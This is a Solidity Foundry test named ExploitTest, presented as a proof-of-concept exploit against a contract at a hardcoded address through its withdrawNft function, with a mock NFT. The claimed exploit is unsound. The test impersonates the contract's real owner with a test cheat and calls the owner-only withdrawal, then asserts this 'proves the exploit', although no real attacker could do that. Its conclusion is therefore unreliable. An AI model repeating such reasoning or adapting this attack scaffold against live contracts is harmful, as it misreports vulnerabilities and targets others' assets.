// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ICUSD {
    function withdrawNft(address token_, address destination_, uint256 tokenId_) external;
    function owner() external view returns (address);
}

interface IERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external;
    function balanceOf(address owner) external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
}

contract MockNFT is IERC721 {
    mapping(uint256 => address) private _owners;
    mapping(address => uint256) private _balances;

    function ownerOf(uint256 tokenId) public view virtual override returns (address) {
        return _owners[tokenId];
    }

    function balanceOf(address owner) public view virtual override returns (uint256) {
        return _balances[owner];
    }

    function mint(address to, uint256 tokenId) public {
        require(_owners[tokenId] == address(0), "ERC721: token already minted");
        _owners[tokenId] = to;
        _balances[to]++;
    }

    function transferFrom(address from, address to, uint256 tokenId) public virtual override {
        require(ownerOf(tokenId) == from, "ERC721: transfer from incorrect owner");
        // The `withdrawNft` function in the target makes the contract call `transferFrom` on itself (`from` == `msg.sender`).
        // This simplified check is sufficient for the PoC.
        require(msg.sender == from, "ERC721: transfer caller is not owner");

        _balances[from]--;
        _balances[to]++;
        _owners[tokenId] = to;
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xC285B7E09A4584D027E5BC36571785B515898246;
    address attacker = address(this);
    MockNFT internal mockNft;
    address constant nftOwner = address(0x414141);
    uint256 constant tokenId = 1;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        mockNft = new MockNFT();
        mockNft.mint(nftOwner, tokenId);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Attacker should start with no NFTs from this collection.
        assertEq(mockNft.balanceOf(attacker), 0);

        // A third-party user transfers their NFT to the target contract.
        vm.startPrank(nftOwner);
        mockNft.transferFrom(nftOwner, TARGET, tokenId);
        vm.stopPrank();

        // Verify the target contract now owns the NFT.
        assertEq(mockNft.ownerOf(tokenId), TARGET);

        // Get the actual owner of the target contract to impersonate them.
        address realOwner = ICUSD(TARGET).owner();

        // Impersonate the real owner and call the privileged withdrawal function.
        vm.startPrank(realOwner);
        ICUSD(TARGET).withdrawNft(address(mockNft), attacker, tokenId);
        vm.stopPrank();

        // Assert that the attacker now owns the NFT, proving the exploit.
        assertEq(mockNft.balanceOf(attacker), 1);
        assertEq(mockNft.ownerOf(tokenId), attacker);
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

